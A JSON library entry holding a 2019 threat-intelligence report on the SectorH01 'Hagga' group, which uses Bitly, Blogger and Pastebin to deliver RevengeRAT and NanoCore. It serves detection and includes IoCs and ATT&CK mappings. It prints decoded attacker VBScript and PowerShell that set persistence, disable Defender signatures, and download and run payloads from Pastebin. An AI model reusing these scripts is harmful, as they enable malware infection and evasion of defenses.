# 0-raw-data/ORKL/library/jsons_entries/c1ca96a6-50ac-4001-9cd8-ec044ce34395.json
{
    "id": "c1ca96a6-50ac-4001-9cd8-ec044ce34395",
    "created_at": "2023-01-12T15:09:21.478676Z",
    "updated_at": "2025-03-27T02:10:20.369659Z",
    "deleted_at": null,
    "sha1_hash": "2d5093aa3b548d26271d7cc4a861694610bd972b",
    "title": "2019-09-19 - Hagga of SectorH01 continues abusing Bitly, Blogger and Pastebin to deliver RevengeRAT and NanoCore",
    "authors": "",
    "file_creation_date": "2022-05-28T22:01:10Z",
    "file_modification_date": "2022-05-28T22:01:10Z",
    "file_size": 2178661,
    "plain_text": "# Hagga of SectorH01 continues abusing Bitly, Blogger and Pastebin to deliver RevengeRAT and NanoCore\n\n**threatrecon.nshc.net/2019/09/19/sectorh01-continues-abusing-web-services/**\n\n## Overview\n\n“Hagga” is the username of a Pastebin account used since December last year by a pervasive known group of threat actors which\ntargets thousands of users around the world both for cyber espionage and cyber crime purposes using malspam. Their activities were\nfirst discovered in 2017, and the ThreatRecon Team tracks both this group and the members behind “Hagga” collectively as the\nSectorH01 group.\n\nSince their activities were first discovered, they have been observed using a variety of commodity malware being spread from the\nsame hosts and communicating with the same C2 addresses. Some of those commodity malware used in the past include\nRevengeRAT and NanoCore, which they are still using till now.\n\n## SectorH01 Group Attack Lifecycle\n\n**Their Targeting**\n\nSectors the SectorH01 group has been observed targeting since discovery, likely for criminal purposes:\n\nAgriculture\nFood\nHospitality\nManufacturing\nNews Media\nShipping\nTourism\nTrade\n\nCountries the SectorH01 group has been observed targeting for this event:\n\nUnited States\nUnited Kingdom\nLatvia\nFrance\nGermany\nIndia\nJapan\nSouth Korea\nTaiwan\nThailand\nTurkey\nVietnam\n\nThe targets of the malware in this blog post appear to be only for criminal activities from June to September targeting enterprise users,\nthe majority of whom are based in the United States.\n\n**The Phish**\n\nSectorH01 group sends phishing emails to their targets with subjects related to payments, such as purchase orders, invoices, request\nfor quotations, telegraphic transfer confirmation documents, or overdue payments. In these emails, they attach file(s) related to the\nemail contents in the form of Excel XLS, Microsoft Word DOC/DOCX, RTF, and ZIP files.\n\n\n-----\n\n-----\n\n-----\n\n**Sample Excel File (b4fdff7dbed8724bde2c097285ce5842373a3d5087f0d492479e62b48e3e5e2d)**\n\nIn the cases of Excel XLS files, they have in recent months been using simple obfuscated VBA macros which executes mshta.exe\nagainst a Bitly shortened link which redirects to a Google Blogger (blogspot) link.\n\n\n-----\n\nVBA Macro which executes mshta.exe embedded in malicious XLS file\n\nThe Blogger page looks benign but has obfuscated JavaScript hidden in its source code. This pattern of obfuscating JavaScript code\nis extensively used not only in the Blogger page but also on Pastebin, which is obfuscated over multiple layers and eventually decodes\nto various VBScript scripts which are run by the mshta.exe utility.\n\nSectorH01 commonly uses multiple layers of the same encoding for its Pastebin scripts\n\nBy performing the same decoding on the Javascript code, we get the VBScript which performs multiple tasks such as terminating\nprocesses and setting persistence.\n\nExample Decoded Script\n\n\n-----\n\n```\nSet X7W832DSA = CreateObject(StrReverse(StrReverse(“WScript.Shell”)))\nDim ASSd712ji8asd\nASSd712ji8asd = “cmd.exe /c taskkill /f /im winword.exe & taskkill /f /im excel.exe & taskkill /f /im MSPUB.exe & taskkill\n/f /im POWERPNT.EXE & exit”\nX7W832DSA.Run ASSd712ji8asd, vbHide\nSet X_ws = CreateObject(“WScript.Shell”)\nPa_2da = “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdate”\nX_ws.RegWrite Pa_2da,”mshta.exe http://pastebin.com/raw/2gY9SAwU”,”REG_EXPAND_SZ”\nSet Mi_G = CreateObject(StrReverse(StrReverse(“WScript.Shell”)))\nDim X_hw\nX_hw0 = StrReverse(“t/ 03 om/ ETUNIM cs/ etaerc/ sksathcs”)\nX_hw1 = “n “”Avast Updater”” /tr “”mshta.ex”\nX_hw2 = “e h” + “t” + “t” + “p” + “:” + “/” + “/” + “p” + “a” + “s” + “t” + “e” + “b” + “i” + “n” + “.” + “c” + “o” + “m” +\n“/” + “r” + “a” + “w” + “/qZXnhtQG”” /F ”\nX_hw = X_hw0 + X_hw1 + X_hw2\nMi_G.Run X_hw, vbHide\nSet Ox_xw = CreateObject(StrReverse(StrReverse(“WScript.Shell”)))\nDim P_wx\nP_wx0 = StrReverse(“t/ 003 om/ ETUNIM cs/ etaerc/ sksathcs”)\nP_wx1 = “n “”Avast backup”” /tr “”mshta.ex”\nP_wx2 = “e h” + “t” + “t” + “p” + “:” + “/” + “/” + “p” + “a” + “s” + “t” + “e” + “b” + “i” + “n” + “.” + “c” + “o” + “m” +\n“/” + “r” + “a” + “w” + “/Htp0LKHg”” /F ”\nP_wx = P_wx0 + P_wx1 + P_wx2\nOx_xw.Run P_wx, vbHide\nself.close\n</script>\n\n```\nGoing into one of the scheduled tasks, we see more encoded text.\n\nExample First-Layer Decoded Scheduled Task\n```\n<script language=”VBScript”>\nSet EAsxw = CreateObject(StrReverse(“llehS.tpircSW”))\nDim Xsks\nXsks =\nStrReverse(“XEI|)OLOL$(gnirtSteG.IICSA::]gnidocnE.txeT.metsyS[;)14,201,63,44,93,101,021,101,64,001,801,501,711,66,38,77,93,0\nX_WRc = StrReverse(“P”) + StrReverse(“o”) + StrReverse(“w”) + StrReverse(StrReverse(StrReverse(StrReverse(“e”)))) +\nStrReverse(“r”) + StrReverse(“s”) + StrReverse(“h”) + StrReverse(StrReverse(StrReverse(StrReverse(“e”)))) +\nStrReverse(StrReverse(“l”)) + StrReverse(StrReverse(“l”)) + StrReverse(“.”) +\nStrReverse(StrReverse(StrReverse(StrReverse(“e”)))) + StrReverse(“x”) + StrReverse(StrReverse(StrReverse(StrReverse(“e”))))\n+ Space(1) + Xsks\nEAsxw.Run X_WRc, vbHide\nself.close\n</script>\n\n```\nFinally, further decoding shows it loading different malware from two Pastebin sites, which are again obfuscated.\n\nExample Second-Layer Decoded Scheduled Task\n```\n[void] [System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.VisualBasic’);$fj=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’DownloadString’,\n[Microsoft.VisualBasic.CallType]::Method,’https://pastebin.com/raw/13AGuyHY’)|IEX;[Byte[]]$f=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’DownloadString’,\n[Microsoft.VisualBasic.CallType]::Method,’https://pastebin.com/raw/0e5uVXL0′).replace(‘#@!’,’0x’)|IEX;\n[k.Hackitup]::exe(‘MSBuild.exe’,$f)\n\n```\nAt other times, the decoded scripts will make use of .NET Reflection\n\nExample of .NET Reflection in Decoded Script\n```\ndo {$ping = test-connection -comp google.com -count 1 -Quiet} until ($ping);[void]\n[System.Reflection.Assembly]::LoadWithPartialName(‘Microsoft.VisualBasic’);$fj=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’DownloadString’,\n[Microsoft.VisualBasic.CallType]::Method,’https://pastebin.com/raw/QppWFhGC’)|IEX;[Byte[]]$f=\n[Microsoft.VisualBasic.Interaction]::CallByname((New-Object Net.WebClient),’DownloadString’,\n[Microsoft.VisualBasic.CallType]::Method,’https://pastebin.com/raw/Q8g1d6Be’).replace(‘)&*^’,’0x’)|IEX;$obj\n=@(‘MSBuild.exe’,$f);$g22=$a.GetType(‘THC452563sdfdsdfgr4777cxg04477fsdf810df777’);$y=$g22.GetMethod(‘retrt477fdg145fd4g0wew\n[Activator]::CreateInstance($g22,$null);$y.Invoke($j,$obj)\n\n```\n\n-----\n\nAfter looking at the various scripts used, we observed these obfuscated JavaScript code mainly serving one or more of these\npurposes:\n\nTerminating Microsoft Office processes winword.exe, excel.exe, MSPUB.exe, POWERPNT.exe, and sometimes Windows\nDefender processes MSASCuiL.exe and MpCmdRun.exe\nInterfering with Windows Defender via command “MpCmdRun.exe -removedefinitions -dynamicsignatures”\nSetting Registry Autorun Persistence to execute mshta.exe on a Pastebin url\nSetting Scheduled Task Persistence to execute mshta.exe on a Pastebin url\nExecuting malware in memory, sometimes in Microsoft’s .NET MSBuild.exe\n\nIn most cases, SectorH01 group in fact performed all of the above and sometimes multiple of the above by stacking multiple Pastebin\nurls and multiple commands in a single url. Moreover, since SectorH01 group is using the “Hagga” Pastebin account which has the\nability to perform edits on the user’s pastes, they at times modify the paste to perform different actions. Below is the attack flow using\nthis sample Excel file as an example.\n\n**Site** **Action**\n\nwww[.]bitly[.]com/adsodeasda Redirect to https://xasjow21d[.]blogspot.com/p/14[.]html\n\nhttps://xasjow21d[.]blogspot.com/p/14[.]html mshta.exe http://www[.]pastebin[.]com/raw/8uJavttD\n\nhttp://www[.]pastebin[.]com/raw/8uJavttD (1) MpCmdRun.exe -removedefinitions -dynamicsignatures\n(2) taskkill winword.exe / excel.exe / MSPUB.exe / POWERPNT.exe / MSASCuiL.exe /\nMpCmdRun.exe\n(3) Run https://pastebin[.]com/raw/7EdEuebH via PowerShell\n(4) Run http://pastebin[.]com/raw/ri21rHbF via mshta.exe\n\nhttp://pastebin[.]com/raw/ri21rHbF Deobfuscates to RevengeRAT\n(CF6293824C97C45680CF999955FD48801856B424DC6E3CEAC6D5E36BB4092856)\n\n\nhttp://pastebin[.]com/raw/ri21rHbF [Paste\nEdit 1]\n\nhttp://pastebin[.]com/raw/ri21rHbF [Paste\nEdit 2]\n\n\n(1) taskkill winword.exe / excel.exe / MSPUB.exe / POWERPNT.exe\n(2) Set Registry Autorun Persistence to execute\nmshta.exe http://pastebin[.]com/raw/2gY9SAwU\n(3) Set Scheduled Task Persistence to execute\nmshta.exe http://pastebin[.]com/raw/qZXnhtQG\n(4) Set Scheduled Task Persistence to execute\nmshta.exe http://pastebin[.]com/raw/Htp0LKHg\n\n(1) ping Google\n(2) Run https://pastebin[.]com/raw/QppWFhGC via Reflection\n(3) Run https://pastebin[.]com/raw/Q8g1d6Be\nreplace(‘)&*^’,’0x’) via Reflection\n\n\nhttp://pastebin[.]com/raw/2gY9SAwU Self.close()\n\nhttp://pastebin[.]com/raw/qZXnhtQG (1) Execute https://pastebin[.]com/raw/13AGuyHY\nvia Reflection\n(2) Execute k.Hackitup() in https://pastebin[.]com/raw/0e5uVXL0\nreplace(‘#@!’,’0x’) via Reflection\n\nhttp://pastebin[.]com/raw/Htp0LKHg Self.close()\n\nhttps://pastebin[.]com/raw/QppWFhGC Deobfuscates to a code injector\n(E22D550423F05EB685AD060A71D58B306E31C473D2D0CACF5794EC424FD3F393)\nObfuscated with ConfuserEx\n\nhttps://pastebin[.]com/raw/Q8g1d6Be Deobfuscates to NanoCore\n(E841F0008D9DA41CD815F75657D305DD69FC169C64FA283BF62DECD02B3D931E)\nObfuscated with Eazfuscator\n\nhttps://pastebin[.]com/raw/13AGuyHY Deobfuscates to a code injector\n(84833991F1705A01A11149C9D037C8379A9C2D463DC30A2FEC27BFA52D218FA6)\nObfuscated with ConfuserEx\n\nhttps://pastebin[.]com/raw/0e5uVXL0 Deobfuscates to NanoCore\n(94B7C5C65637D33F031F1173A68C1D008DD948B6CCBAE42682F82A56D3CF6197)\nObfuscated with Eazfuscator\n\nUsage of bit.ly, blogspot and pastebin allows SectorH01 group to be less traceable on the infrastructure side, but it is because of this\nthat we know their pastes center around the “hagga” user these days. As long as Pastebin tolerates this user, they are likely to\ncontinue using the account because Pastebin pro accounts are no longer for sale\n\n\n-----\n\nBut as pastes can be easily removed by incoming abuse reports, the SectorH01 group hedges their risk by getting to connect to\nmultiple unlisted pastes. We see this same hedging they perform on their target endpoints, where they put multiple layers of\npersistence, use more than one type of RAT at the initial stage, and connect to multiple servers.\n\n**RevengeRAT**\n\nRevengeRAT is a RAT which has its malware builder and source code publicly available. It is set to use the C2 address\nontothenextone[.]duckdns[.]org.\n\nSome of the configuration settings of this RevengeRAT variant\n\nRevengeRAT uses Base64 encoding for its C2 traffic and this information is easily decoded. From the configuration settings, we see\nthe key variable “Revenge-RAT” and the SPL variable “-]NK[-“, both of which are used as delimiters between the Base64 encoded\ndata.\n\n\n-----\n\nInformation sent to the C2 in a past packet capture of this sample which can be easily decoded\n\n**NanoCore**\n\nNanoCore is a RAT which was available for sale from 2014-2016 and has been leaked over the years. While the developer of\nNanoCore was arrested and sentenced last year, the RAT is still used by attackers.\n\nIn this case, the two NanoCore samples we found encoded in Pastebin sites attempted to connect to the C2 addresses\nattilabanks[.]ddns[.]net and yakka[.]duckdns[.]org. The C2 traffic of NanoCore is known to use the DES algorithm for encryption.\n\n## Summary\n\nSectorH01 is a threat group which in most cases, targets seemingly indiscriminately at enterprise users; even when they target for\nespionage, their TTPs have been known to stay fairly constant. They remain brazen in their attacks although we see a slight\nimprovement in their operational security, and still use relatively simple tricks such as macros, known and detected RATs but inmemory only, and connect to domains such as Pastebin and dynamic DNS servers which should raise red flags or at least questions.\nAll of these should be opportunities for organizations to detect the SectorH01 group.\n\n## Indicators of Compromise (IoCs)\n\n**Malicious Documents (SHA-256)**\n\nb4fdff7dbed8724bde2c097285ce5842373a3d5087f0d492479e62b48e3e5e2d\n\nc763340ae4acecd3e7d85b118bbad6bb4b1d433a6398571afd4c2c27a304ab4e\n\ne83304a5ae3e6ef366858c48aa8706d8e088aba86c724d575b4ad2e0ebaea7cd\nd757406ae30d7822ebe63c28ff09ac7b1eca1a0e37e6f706c442f4f7517a624b\n399b7823b707ac07c65940a30e85bdf5c0c7ed1bba5b5034ebcf189937636a44\n\n\n-----\n\n**RevengeRAT (SHA 256)**\nCF6293824C97C45680CF999955FD48801856B424DC6E3CEAC6D5E36BB4092856\n\n**NanoCore (SHA-256)**\n94B7C5C65637D33F031F1173A68C1D008DD948B6CCBAE42682F82A56D3CF6197\nE841F0008D9DA41CD815F75657D305DD69FC169C64FA283BF62DECD02B3D931E\n\n**Code Injectors (SHA-256)**\n84833991F1705A01A11149C9D037C8379A9C2D463DC30A2FEC27BFA52D218FA6\nE22D550423F05EB685AD060A71D58B306E31C473D2D0CACF5794EC424FD3F393\n\n**C2 Domains**\nontothenextone[.]duckdns[.]org\nhaggapaggawagga[.]duckdns.org\nattilabanks[.]ddns[.]net\nyakka[.]duckdns[.]org\n\n**Abused Legitimate Services**\nbitly[.]com/aswoesx2yxwxxd\nbitly[.]com/adsodeasda\nbitly[.]com/uiQSQWSQWSNnase\nbitly[.]com/aswoeosXxxwxhh\nxaasxasxasx[.]blogspot[.]com/p/kudi[.]html\nxasjow21d[.]blogspot[.]com/p/14[.]html\naxxwnxiaxs[.]blogspot[.]com/p/13[.]html\npastebin[.]com/raw/wZSPpxaG\npastebin[.]com/raw/2gY9SAwU\npastebin[.]com/raw/qZXnhtQG\npastebin[.]com/raw/Htp0LKHg\npastebin[.]com/raw/13AGuyHY\npastebin[.]com/raw/0e5uVXL0\npastebin[.]com/raw/8uJavttD\npastebin[.]com/raw/7EdEuebH\npastebin[.]com/raw/ri21rHbF\npastebin[.]com/raw/QppWFhGC\npastebin[.]com/raw/Q8g1d6Be\npastebin[.]com/raw/VpKuzs3R\npastebin[.]com/raw/kqm60tX5\npastebin[.]com/raw/3pEVfu9k\npastebin[.]com/raw/3VNZw83B\npastebin[.]com/raw/8Q050Drg\npastebin[.]com/raw/jX4MuzmX\n\n## MITRE ATT&CK Techniques\n\nThe following is a list of MITRE ATT&CK Techniques we have observed based on our analysis of these and other related malware.\n\n**Initial Access**\n\nT1193 Spearphishing Attachment\n\n**Execution**\n\nT1059 Command-Line Interface\n\nT1173 Dynamic Data Exchange\n\nT1106 Execution through API\n\nT1203 Exploitation for Client Execution\n\nT1170 Mshta\n\nT1086 PowerShell\n\nT1053 Scheduled Task\n\nT1064 Scripting\n\nT1204 User Execution\n\n\n-----\n\n**Persistence**\nT1108 Redundant Access\nT1060 Registry Run Keys / Startup Folder\nT1053 Scheduled Task\n\n**Defense Evasion**\nT1140 Deobfuscate/Decode Files or Information\nT1089 Disabling Security Tools\nT1054 Indicator Blocking\nT1202 Indirect Command Execution\nT1112 Modify Registry\nT1170 Mshta\nT1045 Software Packing\nT1055 Process Injection\nT1064 Scripting\nT1108 Redundant Access\nT1102 Web Service\n\n**Credential Access**\nT1056 Input Capture\nT1081 Credentials in Files\nT1241 Credentials in Registry\n\n**Discovery**\nT1016 System Network Configuration Discovery\nT1033 System Owner/User Discovery\nT1057 Process Discovery\nT1063 Security Software Discovery\nT1082 System Information Discovery\nT1083 File and Directory Discovery\n\n**Collection**\nT1056 Input Capture\nT1123 Audio Capture\nT1125 Video Capture\n\n**Command and Control**\nT1032 Standard Cryptographic Protocol\nT1065 Uncommonly Used Port\nT1094 Custom Command and Control Protocol\nT1105 Remote File Copy\nT1132 Data Encoding\n\n**Exfiltration**\nT1022 Data Encrypted\nT1041 Exfiltration Over Command and Control Channel\n\n## References\n\n[1] The Daily Beast – FBI Arrests Hacker Who Hacked No One\n\n[https://www.thedailybeast.com/fbi-arrests-hacker-who-hacked-no-one](https://www.thedailybeast.com/fbi-arrests-hacker-who-hacked-no-one)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-09-19 - Hagga of SectorH01 continues abusing Bitly, Blogger and Pastebin to deliver RevengeRAT and NanoCore.pdf"
    ],
    "report_names": [
        "2019-09-19 - Hagga of SectorH01 continues abusing Bitly, Blogger and Pastebin to deliver RevengeRAT and NanoCore.pdf"
    ],
    "threat_actors": [
        {
            "id": "28851008-77b4-47eb-abcd-1bb5b3f19fc2",
            "created_at": "2023-06-20T02:02:10.254614Z",
            "updated_at": "2025-03-27T02:00:03.130853Z",
            "deleted_at": null,
            "main_name": "Hagga",
            "aliases": [
                "TH-157",
                "Aggah"
            ],
            "source_name": "MISPGALAXY:Hagga",
            "tools": [
                "Agent Tesla"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536161,
    "ts_updated_at": 1743041420,
    "ts_creation_date": 1653775270,
    "ts_modification_date": 1653775270,
    "files": {
        "pdf": "https://archive.orkl.eu/2d5093aa3b548d26271d7cc4a861694610bd972b.pdf",
        "text": "https://archive.orkl.eu/2d5093aa3b548d26271d7cc4a861694610bd972b.txt",
        "img": "https://archive.orkl.eu/2d5093aa3b548d26271d7cc4a861694610bd972b.jpg"
    }
}